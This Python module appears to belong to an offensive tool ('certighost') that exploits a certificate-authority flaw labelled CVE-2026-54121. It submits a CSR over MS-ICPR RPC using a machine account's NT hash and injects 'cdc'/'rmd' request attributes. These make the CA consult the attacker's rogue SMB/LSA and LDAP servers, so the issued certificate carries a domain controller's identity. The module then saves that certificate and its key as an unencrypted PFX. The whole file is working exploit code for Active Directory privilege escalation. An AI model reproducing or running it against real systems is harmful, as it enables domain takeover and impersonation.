"""
Certificate module — enrollment via Chase Mechanism (CVE-2026-54121).

Submits CSR via MS-ICPR DCE/RPC with CDC/RMD in request attributes.
Requires rogue SMB/LSA and LDAP servers running on the attacker host.
"""

import logging
import os
import struct
import tempfile
from typing import Any, Optional

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

logger = logging.getLogger("certighost.certificate")

# MS-ICPR interface UUID
ICPR_UUID = '91ae6020-9e3c-11cf-8d7c-00aa00c091be'
ICPR_VERSION = '0.0'

# Disposition values
CR_DISP_ISSUED = 3
CR_DISP_UNDER_SUBMISSION = 5


# ============================================================
# NDR structures for MS-ICPR (ICertPassage)
# ============================================================

from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUniConformantArray
from impacket.dcerpc.v5.dtypes import DWORD, ULONG, LPWSTR


class _BYTE_ARRAY(NDRUniConformantArray):
    item = 'B'


class _PBYTE_ARRAY(NDRPOINTER):
    referent = (
        ('Data', _BYTE_ARRAY),
    )


class _CERTTRANSBLOB(NDRSTRUCT):
    structure = (
        ('cb', ULONG),
        ('pb', _PBYTE_ARRAY),
    )


class _CertServerRequest(NDRCALL):
    opnum = 0
    structure = (
        ('dwFlags', DWORD),
        ('pwszAuthority', LPWSTR),
        ('pdwRequestId', DWORD),
        ('pctbAttribs', _CERTTRANSBLOB),
        ('pctbRequest', _CERTTRANSBLOB),
    )


class _CertServerRequestResponse(NDRCALL):
    structure = (
        ('pdwRequestId', DWORD),
        ('pdwDisposition', DWORD),
        ('pctbCert', _CERTTRANSBLOB),
        ('pctbEncodedCert', _CERTTRANSBLOB),
        ('pctbDispositionMessage', _CERTTRANSBLOB),
        ('ErrorCode', ULONG),
    )


# ============================================================
# CSR builder
# ============================================================

def build_chase_csr(
    machine_name: str,
    domain: str,
) -> tuple:
    """
    Build PKCS#10 CSR for chase mechanism.

    The CDC/RMD values go in request attributes, NOT CSR extensions.
    SAN is NOT included - the CA populates identity from chase LDAP lookup.
    """
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048,
    )

    hostname = f"{machine_name.rstrip('$')}.{domain}"
    subject = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, hostname),
    ])

    builder = x509.CertificateSigningRequestBuilder().subject_name(subject)

    csr = builder.sign(private_key, hashes.SHA256())
    csr_der = csr.public_bytes(serialization.Encoding.DER)

    logger.debug(f"CSR built: subject={hostname} (no SAN)")
    logger.debug(f"CSR size: {len(csr_der)} bytes")

    return private_key, csr_der


# ============================================================
# MS-ICPR enrollment via impacket DCE/RPC
# ============================================================

def _submit_csr_rpc(
    ca_ip: str,
    machine_name: str,
    machine_hash: str,
    domain: str,
    dc_ip: str,
    ca_name: str,
    csr_der: bytes,
    attributes: str,
) -> tuple:
    """
    Submit CSR to CA via MS-ICPR (ICertPassage::CertServerRequest).

    Uses machine account NT hash for authentication.
    dwFlags = 0 (not CR_IN_PKCS10 | CR_IN_BINARY).
    Tries ncacn_np (named pipe) first, falls back to EPM tcp.
    """
    from impacket.dcerpc.v5 import transport, epm
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    from impacket.dcerpc.v5.nrpc import checkNullString
    from impacket import uuid

    icpr_uuid = uuid.uuidtup_to_bin((ICPR_UUID, ICPR_VERSION))

    # Build request
    attr_bytes = checkNullString("\n".join(attributes.split("\n"))).encode("utf-16le")

    request = _CertServerRequest()
    request['dwFlags'] = 0
    request['pwszAuthority'] = checkNullString(ca_name)
    request['pdwRequestId'] = 0
    request['pctbAttribs']['cb'] = len(attr_bytes)
    request['pctbAttribs']['pb'] = list(attr_bytes)
    request['pctbRequest']['cb'] = len(csr_der)
    request['pctbRequest']['pb'] = list(csr_der)

    logger.info(f"Connecting to CA at {ca_ip} via DCE/RPC...")
    logger.debug(f"  dwFlags: 0")
    logger.debug(f"  Attributes: {attributes}")
    logger.debug(f"  Auth: {machine_name} (NT hash)")

    dce = None

    # Attempt 1: Named pipe binding
    try:
        binding = f"ncacn_np:{ca_ip}[\\pipe\\cert]"
        logger.debug(f"RPC attempt 1: {binding}")
        rpctransport = transport.DCERPCTransportFactory(binding)
        rpctransport.setRemoteHost(ca_ip)
        rpctransport.set_credentials(machine_name, "", domain, "", machine_hash)
        rpctransport.set_kerberos(False, kdcHost=dc_ip)
        dce = rpctransport.get_dce_rpc()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.connect()
        dce.bind(icpr_uuid)
        logger.debug("RPC attempt 1: bound to ICertPassage")
    except Exception as e:
        logger.debug(f"RPC attempt 1 failed: {e}")
        dce = None

    # Attempt 2: EPM TCP binding
    if dce is None:
        try:
            ep = epm.hept_map(ca_ip, icpr_uuid, protocol='ncacn_ip_tcp')
            logger.debug(f"RPC attempt 2: EPM returned {ep}")
            rpctransport = transport.DCERPCTransportFactory(ep)
            rpctransport.setRemoteHost(ca_ip)
            rpctransport.set_credentials(machine_name, "", domain, "", machine_hash)
            rpctransport.set_kerberos(False, kdcHost=dc_ip)
            dce = rpctransport.get_dce_rpc()
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(icpr_uuid)
            logger.debug("RPC attempt 2: bound to ICertPassage")
        except Exception as e:
            hint = ""
            if "ept_s_not_registered" in str(e):
                hint = (
                    "\n  The ICertPassage RPC endpoint is not registered on "
                    f"{ca_ip}.\n  Possible causes:"
                    "\n    - CA service (certsvc) is not running"
                    "\n    - CA is on a different server (use --ca-ip)"
                    "\n    - ICertPassage interface is disabled"
                )
            raise RuntimeError(f"Cannot connect to CA RPC: {e}{hint}") from e

    logger.info(f"Submitting CSR to CA '{ca_name}' ({len(csr_der)} bytes)...")

    try:
        resp = dce.request(request, checkError=False)
    except Exception as e:
        dce.disconnect()
        raise RuntimeError(f"RPC CertServerRequest failed: {e}") from e

    dce.disconnect()

    disposition = resp["pdwDisposition"]
    request_id = resp["pdwRequestId"]
    logger.info(f"CA response: requestId={request_id}, disposition=0x{disposition & 0xFFFFFFFF:08x}")

    if disposition == CR_DISP_ISSUED:
        logger.info("Certificate ISSUED")
    elif disposition == CR_DISP_UNDER_SUBMISSION:
        logger.warning("Certificate PENDING (requires manual approval)")
    else:
        msg = ""
        try:
            raw_msg = resp["pctbDispositionMessage"]["pb"]
            msg_bytes = bytes(bytearray(raw_msg)) if raw_msg else b""
            msg = msg_bytes.decode("utf-16le", errors="replace").rstrip("\x00")
        except Exception:
            pass
        if (int(disposition) & 0xFFFFFFFF) == 0x800706BA:
            logger.error(
                "CA returned RPC_S_SERVER_UNAVAILABLE — this means the CA attempted "
                "the chase callback but our rogue servers failed. Check SMB/LSA and "
                "LDAP Netlogon diagnostics."
            )
        raise RuntimeError(
            f"Certificate request denied: disposition=0x{disposition & 0xFFFFFFFF:08x} {msg}"
        )

    # Extract certificate (pb is NDR byte array — list of ints)
    raw_pb = resp["pctbEncodedCert"]["pb"]
    cert_der = bytes(bytearray(raw_pb)) if raw_pb else b""
    if not cert_der:
        raw_pb = resp["pctbCert"]["pb"]
        cert_der = bytes(bytearray(raw_pb)) if raw_pb else b""
    if not cert_der:
        raise RuntimeError("CA returned empty certificate")

    try:
        x509.load_der_x509_certificate(cert_der)
    except Exception:
        cert_der = _find_der_cert(cert_der)
        if not cert_der:
            raise RuntimeError("Could not locate DER certificate in RPC response")

    return disposition, cert_der


def _find_der_cert(data: bytes, start: int = 0) -> Optional[bytes]:
    """Locate DER-encoded certificate in response data."""
    for i in range(start, len(data) - 4):
        if data[i] == 0x30 and data[i + 1] == 0x82:
            cert_len = struct.unpack('>H', data[i + 2:i + 4])[0] + 4
            if i + cert_len <= len(data):
                candidate = data[i:i + cert_len]
                try:
                    x509.load_der_x509_certificate(candidate)
                    return candidate
                except Exception:
                    continue
    return None


# ============================================================
# Chase mechanism enrollment (main entry point)
# ============================================================

async def enroll_certificate_chase(
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    ca_name: str,
    cdc_ip: str,
    rmd_hostname: str,
    machine_name: str,
    machine_hash: str,
    template: str = "Machine",
    ca_ip: str = None,
    out_dir: str = None,
) -> dict[str, Any]:
    """
    Enroll certificate via Chase Mechanism (CVE-2026-54121).

    Submits CSR via MS-ICPR RPC with cdc/rmd attributes.
    The CA performs a chase lookup to the rogue SMB/LSA (trust) then LDAP (identity),
    embedding the target DC's identity into the certificate.
    """
    if ca_ip is None:
        ca_ip = dc_ip
    if out_dir is None:
        out_dir = tempfile.gettempdir()

    logger.info(f"Chase Mechanism enrollment:")
    logger.info(f"  CA:       {ca_name} ({ca_ip})")
    logger.info(f"  CDC:      {cdc_ip}")
    logger.info(f"  RMD:      {rmd_hostname}")
    logger.info(f"  Machine:  {machine_name}")
    logger.info(f"  Template: {template}")

    private_key, csr_der = build_chase_csr(
        machine_name=machine_name,
        domain=domain,
    )

    # Request attributes - cdc: and rmd: trigger the chase lookup
    attrs = f"CertificateTemplate:{template}\ncdc:{cdc_ip}\nrmd:{rmd_hostname}"

    # Submit via DCE/RPC with machine account NT hash
    disposition, cert_der = _submit_csr_rpc(
        ca_ip=ca_ip,
        machine_name=machine_name,
        machine_hash=machine_hash,
        domain=domain,
        dc_ip=dc_ip,
        ca_name=ca_name,
        csr_der=csr_der,
        attributes=attrs,
    )

    # Parse the issued certificate
    certificate = x509.load_der_x509_certificate(cert_der)

    # Save as PFX
    pfx_path = os.path.join(out_dir, "certighost_dc.pfx")
    pfx_data = pkcs12.serialize_key_and_certificates(
        name=b"certighost",
        key=private_key,
        cert=certificate,
        cas=None,
        encryption_algorithm=serialization.NoEncryption(),
    )
    with open(pfx_path, "wb") as f:
        f.write(pfx_data)

    logger.info(f"Certificate saved to {pfx_path}")

    # Extract identity from certificate
    cert_subject = certificate.subject.rfc4514_string()
    cert_sid = None
    cert_dns = None

    try:
        san = certificate.extensions.get_extension_for_class(
            x509.SubjectAlternativeName
        )
        dns_names = san.value.get_values_for_type(x509.DNSName)
        if dns_names:
            cert_dns = dns_names[0]
    except x509.ExtensionNotFound:
        pass

    try:
        for ext in certificate.extensions:
            if ext.oid.dotted_string == "1.3.6.1.4.1.311.25.2":
                raw = ext.value.value
                idx = raw.rfind(b'\x04')
                if idx >= 0 and idx + 1 < len(raw):
                    length = raw[idx + 1]
                    sid_bytes = raw[idx + 2:idx + 2 + length]
                    try:
                        cert_sid = sid_bytes.decode('utf-8')
                    except UnicodeDecodeError:
                        cert_sid = sid_bytes.hex()
                else:
                    cert_sid = raw.hex()
                break
    except Exception:
        pass

    cert_info = {
        "certificate": certificate,
        "private_key": private_key,
        "subject": cert_subject,
        "dns": cert_dns or rmd_hostname.split('.')[0],
        "sid": cert_sid or "",
        "pfx_path": pfx_path,
        "disposition": disposition,
    }

    logger.info(f"Certificate identity:")
    logger.info(f"  Subject: {cert_info['subject']}")
    logger.info(f"  DNS:     {cert_info['dns']}")
    logger.info(f"  SID:     {cert_info['sid'] or '(not in cert)'}")

    return cert_info
